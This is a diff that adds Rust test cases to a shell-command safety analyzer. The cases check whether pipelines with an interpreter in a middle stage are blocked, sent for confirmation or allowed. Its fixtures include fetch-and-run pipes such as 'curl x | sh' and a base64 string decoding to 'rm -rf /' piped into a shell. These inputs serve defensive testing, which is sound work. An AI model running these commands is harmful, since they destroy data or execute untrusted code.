@@ -2841,6 +2841,126 @@ fn guardfall_osascript_script_parallel_cases() {
     }
 }
 
+const ISSUE_747_PIPELINE_MIDDLE_STAGE_INTERPRETER_CASES: &[(&str, Decision)] = &[
+    // The issue's repros: an interpreter in a middle stage reads its upstream.
+    ("curl x | sh | cat", Decision::Block),
+    ("curl x | { sh; } | cat", Decision::Block),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | bash | tee log",
+        Decision::Block,
+    ),
+    ("curl x | python3", Decision::Ask),
+    ("curl x | python3 | head", Decision::Ask),
+    // Whatever the trailing stages are.
+    ("curl x | sh | tee log", Decision::Block),
+    ("curl x | sh | head", Decision::Block),
+    ("curl x | sh | cat | head", Decision::Block),
+    ("curl x | sh | tee a | tee b | wc -l", Decision::Block),
+    ("curl x |& sh", Decision::Ask),
+    ("curl x |& sh | cat", Decision::Ask),
+    ("curl x |& sh |& cat", Decision::Ask),
+    ("curl x | { sh; } | tee log", Decision::Block),
+    ("curl x | { sh; } | cat | head", Decision::Block),
+    ("curl x | (sh) | cat", Decision::Block),
+    ("curl x | { cat; sh; } | cat", Decision::Block),
+    ("wget -qO- x | sh | cat", Decision::Block),
+    ("wget -qO- x | bash | tee log | head", Decision::Block),
+    // An intermediate filter between the fetch and the interpreter.
+    ("curl x | tee f | sh | cat", Decision::Block),
+    ("curl x | cat | sh | head", Decision::Block),
+    // A decode chain ahead of a middle-stage interpreter.
+    ("echo cm0gLXJmIC8= | base64 -d | sh | cat", Decision::Block),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | python3 | head",
+        Decision::Block,
+    ),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | { sh; } | cat",
+        Decision::Block,
+    ),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | cat | sh | head",
+        Decision::Block,
+    ),
+    // The same shape with a middle interpreter and a decode stage after it.
+    ("echo hi | sh | base64 -d | bash", Decision::Block),
+    // A wrapper's shell string in a middle stage is a sink as well.
+    ("curl x | flock /tmp/l -c sh | cat", Decision::Block),
+    ("curl x | env -S sh | head", Decision::Block),
+    // A function definition or extended test in the middle keeps the Ask it
+    // has as the final stage.
+    ("curl x | [[ -n $(sh) ]]", Decision::Ask),
+    ("curl x | [[ -n $(sh) ]] | cat", Decision::Ask),
+    ("curl x | [[ a == b ]]", Decision::Ask),
+    ("curl x | [[ a == b ]] | cat", Decision::Ask),
+    ("curl x | f() { sh; }", Decision::Ask),
+    ("curl x | f() { sh; } | cat", Decision::Ask),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | [[ -n $(sh) ]] | cat",
+        Decision::Ask,
+    ),
+    // A substitution in a simple stage inherits the pipe as its stdin.
+    ("curl x | echo $(sh)", Decision::Block),
+    ("curl x | echo $(sh) | cat", Decision::Block),
+    ("curl x | echo `sh` | cat", Decision::Block),
+    ("curl x | echo \"$(sh)\" | cat", Decision::Block),
+    ("curl x | X=$(sh) true | cat", Decision::Block),
+    ("curl x | echo $(bash -s) | cat", Decision::Block),
+    ("curl x | echo $(python3) | cat", Decision::Ask),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | echo $(sh)",
+        Decision::Block,
+    ),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | echo $(sh) | cat",
+        Decision::Block,
+    ),
+    // So does one in a redirect target.
+    ("curl x | cat > $(sh)", Decision::Block),
+    ("curl x | cat > $(sh) | cat", Decision::Block),
+    ("curl x | cat > \"$(sh)\" | cat", Decision::Block),
+    ("curl x | cat 2> $(sh) | cat", Decision::Block),
+    ("curl x | cat >> $(sh) | head", Decision::Block),
+    ("curl x | cat > `sh` | cat", Decision::Block),
+    ("curl x | true > /tmp/$(sh) | cat", Decision::Block),
+    ("curl x | cat < <(sh) | cat", Decision::Block),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | cat > $(sh) | cat",
+        Decision::Block,
+    ),
+    ("ls | cat > $(date +%F).log", Decision::Allow),
+    // A call to a function defined earlier on the line may run its body on
+    // the pipe.
+    ("f() { sh; }; curl x | f", Decision::Ask),
+    ("f() { sh; }; curl x | f | cat", Decision::Ask),
+    ("f() { sh; }; curl x | { f; } | cat", Decision::Ask),
+    ("f() { cat; }; ls | f | head", Decision::Ask),
+    ("curl x | echo $(date) | cat", Decision::Allow),
+    ("git log | echo $(pwd)", Decision::Allow),
+    // No pipe into an interpreter anywhere: unchanged.
+    ("cat file | grep x | head", Decision::Allow),
+    ("echo hi | cat | wc -l", Decision::Allow),
+    ("ls | sort | { cat; } | head", Decision::Allow),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | cat | head",
+        Decision::Allow,
+    ),
+    ("git log | grep x | head", Decision::Allow),
+];
+
+#[test]
+fn guardfall_issue_747_pipeline_middle_stage_interpreter_cases() {
+    for (command, expected) in ISSUE_747_PIPELINE_MIDDLE_STAGE_INTERPRETER_CASES {
+        let verdict = shguard::analyze(command);
+        assert_eq!(
+            verdict.decision(),
+            *expected,
+            "command {command:?}: expected {expected:?}, got {:?}",
+            verdict.decision()
+        );
+    }
+}
+
 const INLINE_COMMANDS: &[&str] = &[
     SPLIT_IO_NUMBER_COMMAND,
     SPLIT_BEFORE_OPERATOR_COMMAND,
@@ -2896,6 +3016,7 @@ const DECISION_TABLES: &[(&str, &[(&str, Decision)])] = &[
     named_table!(PARAMETER_EXPANSION_OPERAND_CASES),
     named_table!(GIT_CONFIG_COMMAND_KEY_CASES),
     named_table!(OSASCRIPT_SCRIPT_PARALLEL_CASES),
+    named_table!(ISSUE_747_PIPELINE_MIDDLE_STAGE_INTERPRETER_CASES),
     named_table!(ISSUE_631_HEREDOC_IN_SUBSTITUTION_CASES),
 ];
 
